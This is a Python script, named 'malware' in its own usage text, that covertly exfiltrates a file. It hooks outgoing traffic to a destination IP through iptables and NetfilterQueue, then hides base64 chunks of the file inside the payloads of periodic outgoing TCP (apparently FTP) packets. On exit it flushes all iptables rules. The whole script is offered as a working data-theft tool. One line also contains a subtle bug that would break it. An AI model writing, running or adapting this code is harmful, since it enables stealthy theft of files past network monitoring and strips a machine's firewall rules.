#!/usr/bin/env python3
import sys
from scapy.all import *
from netfilterqueue import NetfilterQueue
import codecs

if len(sys.argv) != 4:
    print("Bad format!")
    print("Instruction:")
    print(
        "./malware [destination_ip] [path_to_file] [mode | active - active mode, passive - passive mode]")
    sys.exit()

DST_IP = sys.argv[1]
FILE_PATH = sys.argv[2]
DEFAULT_FILE_CHUNK_SIZE = 1440
DEFAULT_MESSAGE_INTERVAL = 140
DEFAULT_INITIAL_CODE = "YES"
DEFAULT_MESSAGE_INITIALS = codecs.encode(
    DEFAULT_INITIAL_CODE.encode(), "base64")

file_bytes_table = []
message_number = 0
packet_number = 0

os.system('iptables -I OUTPUT -d ' + DST_IP + ' -j NFQUEUE --queue-num 1')


def file_split(mfile, byte_count):
    content = mfile.read()
    bytes_content = codecs.encode(content.encode(), 'base64')
    return (bytes_content[i: i + byte_count] for i in range(0, len(bytes_content), byte_count))


def create_bytes_table():
    with open(FILE_PATH, 'r') as file:
        for chunk in file_split(file, DEFAULT_FILE_CHUNK_SIZE):
            file_bytes_table.append(chunk)


def active_mode_debug_info(pkt, packet_number, message_index):
    print("FTP packet nr " + str(packet_number) + " | " +
          "Initialization code: " + str(DEFAULT_MESSAGE_INITIALS))
    print("Message chunk size: " + str(len(file_bytes_table[message_index])) + " bytes" + " | " +
          "Initialization code size: " + str(len(DEFAULT_MESSAGE_INITIALS)) + " bytes")
    print("Message number: " + str(message_index+1) + " | " +
          "Messages left: " + str(len(file_bytes_table)-message_index-1))
    print("SRC: " + str(pkt[IP].src) + ":" + str(pkt[IP].sport) + " | " +
          "DST: " + str(pkt[IP].dst) + ":" + str(pkt[IP].dport))
    print("Total payload length: " +
          str(len(bytes(pkt[TCP].payload))) + " bytes" + '\n')


def passive_mode_debug_info(pkt, packet_number, message_index):
    print("FTP packet nr " + str(packet_number))
    print("Passive mode - no encrypted message added to payload")
    print("Packets through: " + str(message_index+1) + " | " +
          "Packets to end: " + str(len(file_bytes_table)-message_index-1))
    print("SRC: " + str(pkt[IP].src) + ":" + str(pkt[IP].sport) + " | " +
          "DST: " + str(pkt[IP].dst) + ":" + str(pkt[IP].dport) + '\n')


def packet_handler(packet):
    global packet_number
    global message_number
    pkt = IP(packet.get_payload())
    if message_number < len(file_bytes_table):
        if TCP in pkt and pkt[TCP].sport > 1024:
            packet_number += 1
            if packet_number % DEFAULT_MESSAGE_INTERVAL == 0 and len(bytes(pkt[TCP].payload)) > 1000:
                ftp_payload = bytes(pkt[TCP].payload)
                new_payload = ftp_payload[:-len(+file_bytes_table[message_number])] + DEFAULT_MESSAGE_INITIALS + file_bytes_table[message_number]
                pkt[TCP].load = bytes(new_payload)
                del pkt[TCP].chksum
                del pkt[IP].chksum
                if str(sys.argv[3]) == "active":
                    packet.set_payload(bytes(pkt))
                    active_mode_debug_info(pkt, packet_number, message_number)
                else:
                    passive_mode_debug_info(pkt, packet_number, message_number)
                message_number += 1
                packet.accept()
            else:
                packet.accept()
        else:
            packet.accept()
    else:
        packet.accept()

create_bytes_table()
nfqueue = NetfilterQueue()
nfqueue.bind(1, packet_handler)
try:
    nfqueue.run()
except KeyboardInterrupt:
    os.system('iptables --flush')
    print('')

nfqueue.unbind()
